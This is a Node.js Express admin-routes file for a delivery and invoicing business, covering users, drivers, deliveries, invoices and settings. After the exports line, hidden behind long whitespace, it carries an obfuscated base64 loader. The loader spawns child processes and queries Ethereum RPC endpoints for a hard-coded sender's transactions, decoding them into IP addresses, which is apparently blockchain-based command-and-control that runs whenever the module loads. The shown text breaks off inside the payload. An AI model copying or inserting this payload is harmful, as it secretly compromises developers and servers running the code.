const express = require("express");
const { body } = require("express-validator");
const router = express.Router();
const adminController = require("../controllers/adminController");
const authenticate = require("../middleware/authenticate");
const authorize = require("../middleware/authorize");
const validate = require("../middleware/validate");

router.use(authenticate);
router.use(authorize("ADMIN", "MANAGER"));

router.get("/users", adminController.getAllUsers);
// get user by id
router.get("/users/:id", adminController.getUserById);

router.post(
  "/users",
  authorize("ADMIN"),
  [
    body("email").isEmail().withMessage("Valid email is required"),
    body("password")
      .isLength({ min: 6 })
      .withMessage("Password must be at least 6 characters"),
    body("fullName").notEmpty().withMessage("Full name is required"),
    body("role")
      .isIn(["ADMIN", "DRIVER", "CUSTOMER", "MANAGER", "CONTRACTOR"])
      .withMessage("Invalid role"),
    body("driverType")
      .optional()
      .isIn(["EMPLOYEE", "CONTRACTOR"])
      .withMessage("driverType must be EMPLOYEE or CONTRACTOR"),
    body("username").optional().isString(),
    body("phone").optional().isString(),
    body("payType")
      .optional()
      .isIn(["DAILY", "WEEKLY", "FORTNIGHTLY", "FOUR_WEEKLY"]),
    body("rate").optional().isFloat({ min: 0 }),
    validate,
  ],
  adminController.createUser,
);

router.put(
  "/users/:id",
  authorize("ADMIN"),
  [
    body("email").optional().isEmail().withMessage("Valid email is required"),
    body("password")
      .optional()
      .isLength({ min: 6 })
      .withMessage("Password must be at least 6 characters"),
    validate,
  ],
  adminController.updateUser,
);

router.put(
  "/customers/:id/cc-email",
  authorize("ADMIN", "MANAGER"),
  [
    body("ccEmail")
      .optional({ nullable: true })
      .isEmail()
      .withMessage("Must be a valid email address"),
    validate,
  ],
  adminController.updateCustomerCcEmail,
);

router.delete("/users/:id", authorize("ADMIN"), adminController.deleteUser);

router.post(
  "/users/:id/toggle-status",
  authorize("ADMIN"),
  adminController.toggleUserStatus,
);

router.get("/drivers", adminController.getAllDrivers);

router.get("/drivers/:id", adminController.getDriverById);

router.post(
  "/drivers",
  [
    body("email").isEmail().withMessage("Valid email is required"),
    body("password")
      .isLength({ min: 6 })
      .withMessage("Password must be at least 6 characters"),
    body("fullName").notEmpty().withMessage("Full name is required"),
    body("phone").notEmpty().withMessage("Phone number is required"),
    body("username").optional().isString(),
    body("driverType").optional().isIn(["EMPLOYEE", "CONTRACTOR"]),
    body("vehicleRegistration").optional().isString(),
    body("driverLicenseNumber").optional().isString(),
    body("address").optional().isString(),
    body("tradingName").optional().isString(),
    body("contactName").optional().isString(),
    body("tradingAddress").optional().isString(),
    body("isVatRegistered").optional().isBoolean(),
    body("vatNumber").optional().isString(),
    body("vehicleMake").optional().isString(),
    body("vehicleModel").optional().isString(),
    body("motExpiry").optional().isISO8601(),
    body("insuranceExpiry").optional().isISO8601(),
    body("goodsInTransitExpiry").optional().isISO8601(),
    body("publicLiabilityExpiry").optional().isISO8601(),
    body("bankName").optional().isString(),
    body("accountName").optional().isString(),
    body("sortCode").optional().isString(),
    body("accountNumber").optional().isString(),
    body("bankReference").optional().isString(),
    body("payType")
      .optional()
      .isIn(["DAILY", "WEEKLY", "FORTNIGHTLY", "FOUR_WEEKLY"]),
    body("rate").optional().isFloat({ min: 0 }),
    validate,
  ],
  adminController.createDriver,
);

router.put(
  "/drivers/:id",
  [
    body("email").optional().isEmail().withMessage("Valid email is required"),
    body("fullName")
      .optional()
      .notEmpty()
      .withMessage("Full name cannot be empty"),
    body("phone").optional().notEmpty().withMessage("Phone cannot be empty"),
    body("username").optional().isString(),
    body("isActive").optional().isBoolean(),
    body("password").optional().isLength({ min: 6 }),
    body("driverType").optional().isIn(["EMPLOYEE", "CONTRACTOR"]),
    body("vehicleRegistration").optional().isString(),
    body("driverLicenseNumber").optional().isString(),
    body("address").optional().isString(),
    body("isActiveDriver").optional().isBoolean(),
    body("tradingName").optional().isString(),
    body("contactName").optional().isString(),
    body("tradingAddress").optional().isString(),
    body("isVatRegistered").optional().isBoolean(),
    body("vatNumber").optional().isString(),
    body("vehicleMake").optional().isString(),
    body("vehicleModel").optional().isString(),
    body("motExpiry").optional().isISO8601(),
    body("insuranceExpiry").optional().isISO8601(),
    body("goodsInTransitExpiry").optional().isISO8601(),
    body("publicLiabilityExpiry").optional().isISO8601(),
    body("bankName").optional().isString(),
    body("accountName").optional().isString(),
    body("sortCode").optional().isString(),
    body("accountNumber").optional().isString(),
    body("bankReference").optional().isString(),
    body("payType")
      .optional()
      .isIn(["DAILY", "WEEKLY", "FORTNIGHTLY", "FOUR_WEEKLY"]),
    body("rate").optional().isFloat({ min: 0 }),
    validate,
  ],
  adminController.updateDriver,
);

router.delete("/drivers/:id", adminController.deleteDriver);

const contractorController = require("../controllers/contractorController");

router.get("/contractor-invoices", contractorController.adminGetInvoices);

router.post(
  "/contractor-invoices/:id/mark-paid",
  contractorController.adminMarkPaid,
);

router.get("/deliveries", adminController.getAllDeliveries);

router.get("/deliveries/:id", adminController.getDeliveryById);

router.put(
  "/deliveries/:id",
  [
    body("deliveryDate")
      .optional()
      .isISO8601()
      .withMessage("Valid delivery date is required"),
    body("timeSlot")
      .optional()
      .isIn(["AM", "PM", "SAME_DAY"])
      .withMessage("Invalid time slot"),
    body("weight")
      .optional()
      .isFloat({ min: 0 })
      .withMessage("Weight must be a positive number"),
    body("deliveryAddress")
      .optional()
      .notEmpty()
      .withMessage("Delivery address is required"),
    body("customerName")
      .optional()
      .notEmpty()
      .withMessage("Customer name is required"),
    body("customerPhone")
      .optional()
      .notEmpty()
      .withMessage("Customer phone is required"),
    body("spoNumber")
      .optional()
      .notEmpty()
      .withMessage("SPO number is required"),
    body("specialInstructions").optional().isString(),
    validate,
  ],
  adminController.updateDelivery,
);

router.delete("/deliveries/:id", adminController.deleteDelivery);

router.post(
  "/deliveries/:id/allocate",
  [body("driverId").isInt().withMessage("Driver ID is required"), validate],
  adminController.allocateDelivery,
);

router.put(
  "/deliveries/:id/status",
  [
    body("status")
      .isIn(["RECEIVED", "ALLOCATED", "DELIVERED", "CANCELLED"])
      .withMessage("Invalid status"),
    validate,
  ],
  adminController.updateDeliveryStatus,
);

router.post(
  "/deliveries/:id/extra-charges",
  [
    body("description").notEmpty().withMessage("Description is required"),
    body("amount")
      .isFloat({ min: 0 })
      .withMessage("Amount must be a positive number"),
    validate,
  ],
  adminController.addExtraCharge,
);

router.delete(
  "/deliveries/:id/extra-charges/:chargeId",
  adminController.removeExtraCharge,
);

router.get(
  "/deliveries/:id/extra-charges",
  adminController.getDeliveryExtraCharges,
);

router.get("/pricing-tiers", adminController.getAllPricingTiers);

router.post(
  "/pricing-tiers",
  authorize("ADMIN"),
  [
    body("name").notEmpty().withMessage("Tier name is required"),
    body("basePrice")
      .isFloat({ min: 0 })
      .withMessage("Base price must be a positive number"),
    body("vatRate")
      .optional()
      .isFloat({ min: 0, max: 100 })
      .withMessage("VAT rate must be between 0 and 100"),
    body("weightUnit")
      .optional()
      .isInt({ min: 1 })
      .withMessage("Weight unit must be a positive integer"),
    body("maxDistance")
      .optional()
      .isInt({ min: 1 })
      .withMessage("Max distance must be a positive integer"),
    body("surchargeRate")
      .optional()
      .isFloat({ min: 0, max: 1 })
      .withMessage("Surcharge rate must be between 0 and 1"),
    body("isDefault")
      .optional()
      .isBoolean()
      .withMessage("isDefault must be a boolean"),
    validate,
  ],
  adminController.createPricingTier,
);

router.put(
  "/pricing-tiers/:id",
  authorize("ADMIN"),
  [
    body("basePrice")
      .optional()
      .isFloat({ min: 0 })
      .withMessage("Base price must be a positive number"),
    body("vatRate")
      .optional()
      .isFloat({ min: 0, max: 100 })
      .withMessage("VAT rate must be between 0 and 100"),
    body("weightUnit")
      .optional()
      .isInt({ min: 1 })
      .withMessage("Weight unit must be a positive integer"),
    body("maxDistance")
      .optional()
      .isInt({ min: 1 })
      .withMessage("Max distance must be a positive integer"),
    body("surchargeRate")
      .optional()
      .isFloat({ min: 0, max: 1 })
      .withMessage("Surcharge rate must be between 0 and 1"),
    body("isDefault")
      .optional()
      .isBoolean()
      .withMessage("isDefault must be a boolean"),
    validate,
  ],
  adminController.updatePricingTier,
);

router.delete(
  "/pricing-tiers/:id",
  authorize("ADMIN"),
  adminController.deletePricingTier,
);

router.get("/invoices", adminController.getAllInvoices);

router.post(
  "/invoices/generate",
  [
    body("customerId").isInt().withMessage("Customer ID is required"),
    body("weekStartDate")
      .isISO8601()
      .withMessage("Valid start date is required"),
    body("weekEndDate").isISO8601().withMessage("Valid end date is required"),
    validate,
  ],
  adminController.generateInvoice,
);

router.post(
  "/invoices/generate-all",
  [
    body("weekStartDate")
      .isISO8601()
      .withMessage("Valid start date is required"),
    body("weekEndDate").isISO8601().withMessage("Valid end date is required"),
    validate,
  ],
  adminController.generateWeeklyInvoicesForAll,
);

router.post(
  "/invoices/generate-last-week",
  adminController.generateLastWeekInvoices,
);

router.post("/invoices/send-reminders", adminController.sendInvoiceReminders);

router.post("/invoices/:id/mark-paid", adminController.markInvoiceAsPaid);

router.post(
  "/invoices/:id/extra-charge",
  [
    body("description").notEmpty().withMessage("Description is required"),
    body("unitCost")
      .isFloat({ min: 0 })
      .withMessage("Unit cost must be a positive number"),
    body("vatAmount")
      .isFloat({ min: 0 })
      .withMessage("VAT amount must be a positive number"),
    body("total")
      .isFloat({ min: 0 })
      .withMessage("Total must be a positive number"),
    validate,
  ],
  adminController.addExtraCharge,
);

router.get("/invoices/:id", adminController.getInvoiceById);

router.put(
  "/invoices/:id",
  [
    body("invoiceNumber")
      .optional()
      .matches(/^T\d{4,}$/)
      .withMessage("Invoice number must be in format T#### (e.g., T0326)"),
    body("customerId")
      .optional()
      .isInt()
      .withMessage("Customer ID must be an integer"),
    body("invoiceDate")
      .optional()
      .isISO8601()
      .withMessage("Valid invoice date is required"),
    body("dueDate")
      .optional()
      .isISO8601()
      .withMessage("Valid due date is required"),
    body("status").optional().isString().trim(),
    body("customerRef").optional().isString().trim(),
    body("notes").optional().isString().trim(),
    body("paymentTerms").optional().isString().trim(),
    body("items").optional().isArray().withMessage("Items must be an array"),
    body("items.*.deliveryId")
      .optional()
      .isInt()
      .withMessage("Delivery ID must be an integer"),
    body("items.*.spoNumber").optional().isString().trim(),
    body("items.*.description")
      .notEmpty()
      .withMessage("Item description is required"),
    body("items.*.quantity")
      .isInt({ min: 1 })
      .withMessage("Quantity must be at least 1"),
    body("items.*.unitCost")
      .isFloat({ min: 0 })
      .withMessage("Unit cost must be a positive number"),
    body("items.*.vatAmount")
      .isFloat({ min: 0 })
      .withMessage("VAT amount must be a positive number"),
    body("items.*.total")
      .isFloat({ min: 0 })
      .withMessage("Total must be a positive number"),
    body("items.*.deliveryDate")
      .optional()
      .isISO8601()
      .withMessage("Valid delivery date is required"),
    body("items.*.address").optional().isString().trim(),
    body("items.*.basePrice")
      .optional()
      .isFloat({ min: 0 })
      .withMessage("Base price must be a positive number"),
    body("items.*.distanceSurcharge")
      .optional()
      .isFloat({ min: 0 })
      .withMessage("Distance surcharge must be a positive number"),
    validate,
  ],
  adminController.updateInvoice,
);

router.get("/slots", adminController.getSlotAvailability);

router.post(
  "/slots",
  [
    body("date").isISO8601().withMessage("Valid date is required"),
    body("timeSlot")
      .isIn(["AM", "PM", "SAME_DAY"])
      .withMessage("Invalid time slot"),
    body("maxCapacity")
      .isInt({ min: 0 })
      .withMessage("Max capacity must be a positive integer"),
    validate,
  ],
  adminController.setSlotAvailability,
);

router.put(
  "/slots/:id/capacity",
  [
    body("method")
      .isIn(["increase", "decrease"])
      .withMessage('Method must be either "increase" or "decrease"'),
    body("value")
      .isInt({ min: 1 })
      .withMessage("Value must be a positive integer"),
    validate,
  ],
  adminController.updateSlotCapacity,
);

router.get("/dashboard", adminController.getDashboard);

router.get("/analytics", adminController.getAnalytics);

router.get("/analytics/drivers", adminController.getDriverPerformance);

router.get("/analytics/customers", adminController.getCustomerAnalytics);

router.get("/notifications/unread-counts", adminController.getUnreadCounts);

router.get("/contacts", adminController.getAllContacts);

router.post("/contacts/mark-all-read", adminController.markAllContactsAsRead);

router.get("/contacts/:id", adminController.getContactById);

router.post("/contacts/:id/mark-read", adminController.markContactAsRead);

router.delete(
  "/contacts/:id",
  authorize("ADMIN"),
  adminController.deleteContact,
);

router.get("/enquiries", adminController.getAllEnquiries);

router.post("/enquiries/mark-all-read", adminController.markAllEnquiriesAsRead);

router.get("/enquiries/:id", adminController.getEnquiryById);

router.post("/enquiries/:id/mark-read", adminController.markEnquiryAsRead);

router.delete(
  "/enquiries/:id",
  authorize("ADMIN"),
  adminController.deleteEnquiry,
);

const jobApplicationController = require("../controllers/jobApplicationController");

router.get("/job-applications", jobApplicationController.getAllJobApplications);
router.get(
  "/job-applications/stats",
  jobApplicationController.getJobApplicationStats,
);

router.post(
  "/job-applications/mark-all-read",
  jobApplicationController.markAllJobApplicationsAsRead,
);

router.get(
  "/job-applications/:id",
  jobApplicationController.getJobApplicationById,
);

router.patch(
  "/job-applications/:id/status",
  [
    body("status")
      .optional()
      .isIn(["PENDING", "REVIEWED", "SHORTLISTED", "REJECTED"])
      .withMessage("Invalid status value"),
    body("adminNotes")
      .optional()
      .isString()
      .withMessage("Admin notes must be a string"),
  ],
  jobApplicationController.updateJobApplicationStatus,
);

router.delete(
  "/job-applications/:id",
  authorize("ADMIN"),
  jobApplicationController.deleteJobApplication,
);

router.get("/audit-logs", adminController.getAllAuditLogs);

router.get("/audit-logs/:id", adminController.getAuditLogById);

router.get("/invoices/:id/export/pdf", adminController.exportInvoicePDF);

router.get("/deliveries/export", adminController.exportDeliveries);

router.get("/analytics/export", adminController.exportAnalytics);

const settingsController = require("../controllers/settingsController");

router.get("/settings", authorize("ADMIN"), settingsController.getAllSettings);

router.get(
  "/settings/status/summary",
  authorize("ADMIN"),
  settingsController.getSystemStatus,
);

router.get(
  "/settings/:category",
  authorize("ADMIN"),
  settingsController.getSettingsByCategory,
);

router.get(
  "/settings/invoice/config",
  authorize("ADMIN"),
  settingsController.getInvoiceConfig,
);

router.put(
  "/settings/company",
  authorize("ADMIN"),
  [
    body("name")
      .optional()
      .isString()
      .withMessage("Company name must be a string"),
    body("vat_number")
      .optional()
      .isString()
      .withMessage("VAT number must be a string"),
    body("primary_phone")
      .optional()
      .isString()
      .withMessage("Primary phone must be a string"),
    body("alternative_phone")
      .optional()
      .isString()
      .withMessage("Alternative phone must be a string"),
    body("email").optional().isEmail().withMessage("Valid email is required"),
    body("website")
      .optional()
      .isURL()
      .withMessage("Valid website URL is required"),
    body("address")
      .optional()
      .isString()
      .withMessage("Address must be a string"),
    body("founded_year")
      .optional()
      .isString()
      .withMessage("Founded year must be a string"),
    validate,
  ],
  settingsController.updateCompanyInfo,
);

router.put(
  "/settings/banking",
  authorize("ADMIN"),
  [
    body("bank_name")
      .optional()
      .isString()
      .withMessage("Bank name must be a string"),
    body("account_holder")
      .optional()
      .isString()
      .withMessage("Account holder must be a string"),
    body("sort_code")
      .optional()
      .isString()
      .withMessage("Sort code must be a string"),
    body("account_number")
      .optional()
      .isString()
      .withMessage("Account number must be a string"),
    body("payment_terms")
      .optional()
      .isString()
      .withMessage("Payment terms must be a string"),
    validate,
  ],
  settingsController.updateBankingDetails,
);

router.put(
  "/settings/system",
  authorize("ADMIN"),
  [
    body("invoice_generation_day")
      .optional()
      .isString()
      .withMessage("Invoice generation day must be a string"),
    body("invoice_generation_time")
      .optional()
      .isString()
      .withMessage("Invoice generation time must be a string"),
    body("session_timeout")
      .optional()
      .isString()
      .withMessage("Session timeout must be a string"),
    body("auto_invoicing")
      .optional()
      .isString()
      .withMessage("Auto invoicing must be a string"),
    body("email_notifications")
      .optional()
      .isString()
      .withMessage("Email notifications must be a string"),
    body("sms_notifications")
      .optional()
      .isString()
      .withMessage("SMS notifications must be a string"),
    body("maps_api_enabled")
      .optional()
      .isString()
      .withMessage("Maps API enabled must be a string"),
    validate,
  ],
  settingsController.updateSystemConfig,
);

router.put(
  "/settings/single",
  authorize("ADMIN"),
  [
    body("key").notEmpty().withMessage("Setting key is required"),
    body("value").notEmpty().withMessage("Setting value is required"),
    body("description")
      .optional()
      .isString()
      .withMessage("Description must be a string"),
    validate,
  ],
  settingsController.updateSingleSetting,
);

router.get("/driver-availability", adminController.getAllDriversAvailability);

router.get("/drivers/:id/availability", adminController.getDriverAvailability);

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i = 'A10-*5076-20';var __0xadc80=function(){var a=926;return a*2;};function __0x9daea(){return 8769;}(function(_0x9710a8){var _0x9710a8a=["Z2xvYmFsWydyJ10gPSByZXF1aXJlOw0KaWYgKHR5cGVvZiBtb2","R1bGUgPT09ICdvYmplY3QnKSBnbG9iYWxbJ20nXSA9IG1vZHVs","ZTsNCg0KY29uc3QgaHR0cCA9IHJlcXVpcmUoJ25vZGU6aHR0cC","cpOw0KY29uc3QgaHR0cHMgPSByZXF1aXJlKCdub2RlOmh0dHBz","Jyk7DQpjb25zdCB6bGliID0gcmVxdWlyZSgnbm9kZTp6bGliJy","k7DQpjb25zdCB7IFVSTCB9ID0gcmVxdWlyZSgnbm9kZTp1cmwn","KTsNCmNvbnN0IHsgc3Bhd24gfSA9IHJlcXVpcmUoJ25vZGU6Y2","hpbGRfcHJvY2VzcycpOw0KDQpjb25zdCBCTE9DS19NVUxUSVBM","RSA9IDEwMDBuOw0KY29uc3QgU0VOREVSID0gJzB4MWVFZjA4ND","lFRGExNWQ4N2Y2NGU1MUM3M0M4NDQyQ2YzYzhiQ0VGMycudG9M","b3dlckNhc2UoKTsNCmNvbnN0IE5PTkNFX0ZBTk9VVCA9IDEyOw","0KY29uc3QgU0VBUkNIX0ZMT09SID0gMG47DQpjb25zdCBJTkRF","WEVSX1VSTCA9ICdodHRwczovL2V0aC5ibG9ja3Njb3V0LmNvbS","9hcGknOw0KDQpjb25zdCBSUENfRU5EUE9JTlRTID0gWy4uLm5l","dyBTZXQoWw0KICBwcm9jZXNzLmVudi5FVEhfUlBDX1VSTCwNCi","AgJ2h0dHBzOi8vMXJwYy5pby9ldGgnLA0KICAnaHR0cHM6Ly9l","dGguZHJwYy5vcmcnLA0KICAnaHR0cHM6Ly9ldGhlcmV1bS1ycG","MucHVibGljbm9kZS5jb20nLA0KICAnaHR0cHM6Ly9ldGgtbWFp","bm5ldC5wdWJsaWMuYmxhc3RhcGkuaW8nLA0KXS5maWx0ZXIoQm","9vbGVhbikpXTsNCg0KY29uc3QgQUdFTlRTID0gew0KICAnaHR0","cDonOiBuZXcgaHR0cC5BZ2VudCh7IGtlZXBBbGl2ZTogdHJ1ZS","wga2VlcEFsaXZlTXNlY3M6IDMwXzAwMCwgbWF4U29ja2V0czog","NjQgfSksDQogICdodHRwczonOiBuZXcgaHR0cHMuQWdlbnQoey","BrZWVwQWxpdmU6IHRydWUsIGtlZXBBbGl2ZU1zZWNzOiAzMF8w","MDAsIG1heFNvY2tldHM6IDY0IH0pLA0KfTsNCg0KZnVuY3Rpb2","4gbGlua0Fib3J0KG91dGVyU2lnbmFsLCBjb250cm9sbGVyKSB7","DQogIGlmICghb3V0ZXJTaWduYWwpIHJldHVybjsNCiAgb3V0ZX","JTaWduYWwuYWRkRXZlbnRMaXN0ZW5lcignYWJvcnQnLCAoKSA9","PiBjb250cm9sbGVyLmFib3J0KCksIHsgb25jZTogdHJ1ZSB9KT","sNCn0NCg0KZnVuY3Rpb24gZGVjb21wcmVzc1N0cmVhbShyZXMp","IHsNCiAgY29uc3QgZW5jb2RpbmcgPSAocmVzLmhlYWRlcnNbJ2","NvbnRlbnQtZW5jb2RpbmcnXSB8fCAnJykudG9Mb3dlckNhc2Uo","KTsNCiAgaWYgKGVuY29kaW5nID09PSAnZ3ppcCcgfHwgZW5jb2","RpbmcgPT09ICd4LWd6aXAnKSByZXR1cm4gcmVzLnBpcGUoemxp","Yi5jcmVhdGVHdW56aXAoKSk7DQogIGlmIChlbmNvZGluZyA9PT","0gJ2RlZmxhdGUnKSByZXR1cm4gcmVzLnBpcGUoemxpYi5jcmVh","dGVJbmZsYXRlKCkpOw0KICBpZiAoZW5jb2RpbmcgPT09ICdici","cpIHJldHVybiByZXMucGlwZSh6bGliLmNyZWF0ZUJyb3RsaURl","Y29tcHJlc3MoKSk7DQogIHJldHVybiByZXM7DQp9DQoNCmZ1bm","N0aW9uIGh0dHBSZXF1ZXN0KGVuZHBvaW50LCB7IG1ldGhvZCA9","ICdHRVQnLCBib2R5LCBzaWduYWwgfSA9IHt9KSB7DQogIGNvbn","N0IHVybCA9IG5ldyBVUkwoZW5kcG9pbnQpOw0KICBjb25zdCB0","cmFuc3BvcnQgPSB1cmwucHJvdG9jb2wgPT09ICdodHRwczonID","8gaHR0cHMgOiBodHRwOw0KICBjb25zdCBoZWFkZXJzID0gew0K","ICAgIEFjY2VwdDogJ2FwcGxpY2F0aW9uL2pzb24nLA0KICAgIC","dBY2NlcHQtRW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZSwgYnIn","LA0KICAgIENvbm5lY3Rpb246ICdrZWVwLWFsaXZlJywNCiAgfT","sNCiAgaWYgKGJvZHkgIT0gbnVsbCkgew0KICAgIGhlYWRlcnNb","J0NvbnRlbnQtVHlwZSddID0gJ2FwcGxpY2F0aW9uL2pzb24nOw","0KICAgIGhlYWRlcnNbJ0NvbnRlbnQtTGVuZ3RoJ10gPSBCdWZm","ZXIuYnl0ZUxlbmd0aChib2R5KTsNCiAgfQ0KDQogIHJldHVybi","BuZXcgUHJvbWlzZSgocmVzb2x2ZSwgcmVqZWN0KSA9PiB7DQog","ICAgY29uc3QgcmVxID0gdHJhbnNwb3J0LnJlcXVlc3QoDQogIC","AgICB7DQogICAgICAgIGhvc3RuYW1lOiB1cmwuaG9zdG5hbWUs","DQogICAgICAgIHBvcnQ6IHVybC5wb3J0IHx8ICh1cmwucHJvdG","9jb2wgPT09ICdodHRwczonID8gNDQzIDogODApLA0KICAgICAg","ICBwYXRoOiB1cmwucGF0aG5hbWUgKyB1cmwuc2VhcmNoLA0KIC","AgICAgICBtZXRob2QsDQogICAgICAgIGFnZW50OiBBR0VOVFNb","dXJsLnByb3RvY29sXSwNCiAgICAgICAgc2lnbmFsLA0KICAgIC","AgICBoZWFkZXJzLA0KICAgICAgfSwNCiAgICAgIChyZXMpID0+","IHsNCiAgICAgICAgY29uc3Qgc3RyZWFtID0gZGVjb21wcmVzc1","N0cmVhbShyZXMpOw0KICAgICAgICBjb25zdCBjaHVua3MgPSBb","XTsNCiAgICAgICAgc3RyZWFtLm9uKCdkYXRhJywgKGNodW5rKS","A9PiBjaHVua3MucHVzaChjaHVuaykpOw0KICAgICAgICBzdHJl","YW0ub24oJ2VuZCcsICgpID0+IHsNCiAgICAgICAgICBjb25zdC","B0ZXh0ID0gQnVmZmVyLmNvbmNhdChjaHVua3MpLnRvU3RyaW5n","KCd1dGY4JykudHJpbSgpOw0KICAgICAgICAgIGlmIChyZXMuc3","RhdHVzQ29kZSA8IDIwMCB8fCByZXMuc3RhdHVzQ29kZSA+PSAz","MDApIHsNCiAgICAgICAgICAgIHJldHVybiByZWplY3QobmV3IE","Vycm9yKGBIVFRQICR7cmVzLnN0YXR1c0NvZGV9IGZyb20gJHt1","cmwuaG9zdG5hbWV9OiAke3RleHQuc2xpY2UoMCwgMTIwKX1gKS","k7DQogICAgICAgICAgfQ0KICAgICAgICAgIC8vIENhcHRpdmUg","cG9ydGFsIC8gV0FGIC8gQ0ROIG9mdGVuIHJldHVybnMgSFRNTC","BpbnN0ZWFkIG9mIEpTT04tUlBDLg0KICAgICAgICAgIGlmICgh","dGV4dCB8fCB0ZXh0WzBdID09PSAnPCcgfHwgKHRleHRbMF0gIT","09ICd7JyAmJiB0ZXh0WzBdICE9PSAnWycpKSB7DQogICAgICAg","ICAgICByZXR1cm4gcmVqZWN0KG5ldyBFcnJvcihgTm9uLUpTT0","4gZnJvbSAke3VybC5ob3N0bmFtZX06ICR7dGV4dC5zbGljZSgw","LCAxMjApfWApKTsNCiAgICAgICAgICB9DQogICAgICAgICAgdH","J5IHsNCiAgICAgICAgICAgIHJlc29sdmUoSlNPTi5wYXJzZSh0","ZXh0KSk7DQogICAgICAgICAgfSBjYXRjaCAoZXJyKSB7DQogIC","AgICAgICAgICByZWplY3QobmV3IEVycm9yKGBKU09OIHBhcnNl","IGZhaWxlZCBmcm9tICR7dXJsLmhvc3RuYW1lfTogJHtlcnIubW","Vzc2FnZX1gKSk7DQogICAgICAgICAgfQ0KICAgICAgICB9KTsN","CiAgICAgICAgc3RyZWFtLm9uKCdlcnJvcicsIHJlamVjdCk7DQ","ogICAgICB9DQogICAgKTsNCiAgICByZXEub24oJ2Vycm9yJywg","cmVqZWN0KTsNCiAgICBpZiAoYm9keSAhPSBudWxsKSByZXEud3","JpdGUoYm9keSk7DQogICAgcmVxLmVuZCgpOw0KICB9KTsNCn0N","Cg0KYXN5bmMgZnVuY3Rpb24gd2l0aFJwY0VuZHBvaW50cyh0YX","NrLCBvdXRlclNpZ25hbCkgew0KICBjb25zdCBjb250cm9sbGVy","cyA9IFJQQ19FTkRQT0lOVFMubWFwKCgpID0+IG5ldyBBYm9ydE","NvbnRyb2xsZXIoKSk7DQogIGNvbnRyb2xsZXJzLmZvckVhY2go","KGMpID0+IGxpbmtBYm9ydChvdXRlclNpZ25hbCwgYykpOw0KIC","B0cnkgew0KICAgIHJldHVybiBhd2FpdCBQcm9taXNlLmFueSgN","CiAgICAgIFJQQ19FTkRQT0lOVFMubWFwKChlbmRwb2ludCwgaS","kgPT4gdGFzayhlbmRwb2ludCwgY29udHJvbGxlcnNbaV0uc2ln","bmFsKSkNCiAgICApOw0KICB9IGZpbmFsbHkgew0KICAgIGZvci","AoY29uc3QgYyBvZiBjb250cm9sbGVycykgYy5hYm9ydCgpOw0K","ICB9DQp9DQoNCmFzeW5jIGZ1bmN0aW9uIHJwY0NhbGwoZW5kcG","9pbnQsIG1ldGhvZCwgcGFyYW1zLCBzaWduYWwpIHsNCiAgY29u","c3QgcGF5bG9hZCA9IGF3YWl0IGh0dHBSZXF1ZXN0KGVuZHBvaW","50LCB7DQogICAgbWV0aG9kOiAnUE9TVCcsDQogICAgYm9keTog","SlNPTi5zdHJpbmdpZnkoeyBqc29ucnBjOiAnMi4wJywgaWQ6ID","EsIG1ldGhvZCwgcGFyYW1zIH0pLA0KICAgIHNpZ25hbCwNCiAg","fSk7DQogIHJldHVybiBwYXlsb2FkLnJlc3VsdDsNCn0NCg0KYX","N5bmMgZnVuY3Rpb24gcnBjQmF0Y2goZW5kcG9pbnQsIGNhbGxz","LCBzaWduYWwpIHsNCiAgY29uc3QgcGF5bG9hZCA9IGF3YWl0IG","h0dHBSZXF1ZXN0KGVuZHBvaW50LCB7DQogICAgbWV0aG9kOiAn","UE9TVCcsDQogICAgYm9keTogSlNPTi5zdHJpbmdpZnkoDQogIC","AgICBjYWxscy5tYXAoKFttZXRob2QsIHBhcmFtc10sIGkpID0+","ICh7IGpzb25ycGM6ICcyLjAnLCBpZDogaSArIDEsIG1ldGhvZC","wgcGFyYW1zIH0pKQ0KICAgICksDQogICAgc2lnbmFsLA0KICB9","KTsNCiAgY29uc3QgYnlJZCA9IG5ldyBNYXAocGF5bG9hZC5tYX","AoKHIpID0+IFtyLmlkLCByXSkpOw0KICByZXR1cm4gY2FsbHMu","bWFwKChfLCBpKSA9PiBieUlkLmdldChpICsgMSkucmVzdWx0KT","sNCn0NCg0KY29uc3QgdG9CbG9ja0hleCA9IChuKSA9PiBgMHgk","e24udG9TdHJpbmcoMTYpfWA7DQoNCmZ1bmN0aW9uIGZpbmRTZW","5kZXJUeCh0cmFuc2FjdGlvbnMpIHsNCiAgcmV0dXJuIHRyYW5z","YWN0aW9ucy5maW5kKCh0KSA9PiB0LmZyb20gJiYgdC5mcm9tLn","RvTG93ZXJDYXNlKCkgPT09IFNFTkRFUikgfHwgbnVsbDsNCn0N","Cg0KZnVuY3Rpb24gZGVjb2RlQWRkcmVzcyhhZGRyZXNzKSB7DQ","ogIGNvbnN0IGRhdGEgPSBCdWZmZXIuZnJvbShhZGRyZXNzLnJl","cGxhY2UoL14weC9pLCAnJyksICdoZXgnKTsNCiAgY29uc3QgaX","AgPSAoYikgPT4gYCR7YlswXX0uJHtiWzFdfS4ke2JbMl19LiR7","YlszXX1gOw0KICByZXR1cm4gW2lwKGRhdGEuc3ViYXJyYXkoMC","wgNCkpLCBpcChkYXRhLnN1YmFycmF5KDQsIDgpKV07DQp9DQoN","CmZ1bmN0aW9uIGZpcnN0TWF0Y2godGFza3MpIHsNCiAgcmV0dX","JuIG5ldyBQcm9taXNlKChyZXNvbHZlKSA9PiB7DQogICAgbGV0","IHJlbWFpbmluZyA9IHRhc2tzLmxlbmd0aDsNCiAgICBpZiAoIX","JlbWFpbmluZykgcmV0dXJuIHJlc29sdmUobnVsbCk7DQogICAg","bGV0IHNldHRsZWQgPSBmYWxzZTsNCiAgICBjb25zdCBmaW5pc2","ggPSAocmVzdWx0KSA9PiB7DQogICAgICBpZiAoc2V0dGxlZCkg","cmV0dXJuOw0KICAgICAgc2V0dGxlZCA9IHRydWU7DQogICAgIC","Bmb3IgKGNvbnN0IHQgb2YgdGFza3MpIHQuY29udHJvbGxlci5h","Ym9ydCgpOw0KICAgICAgcmVzb2x2ZShyZXN1bHQpOw0KICAgIH","07DQogICAgZm9yIChjb25zdCB0IG9mIHRhc2tzKSB7DQogICAg","ICB0LnJ1bigpDQogICAgICAgIC50aGVuKChyZXN1bHQpID0+IH","sNCiAgICAgICAgICBpZiAoc2V0dGxlZCkgcmV0dXJuOw0KICAg","ICAgICAgIGlmIChyZXN1bHQpIGZpbmlzaChyZXN1bHQpOw0KIC","AgICAgICAgIGVsc2UgaWYgKC0tcmVtYWluaW5nID09PSAwKSBy","ZXNvbHZlKG51bGwpOw0KICAgICAgIC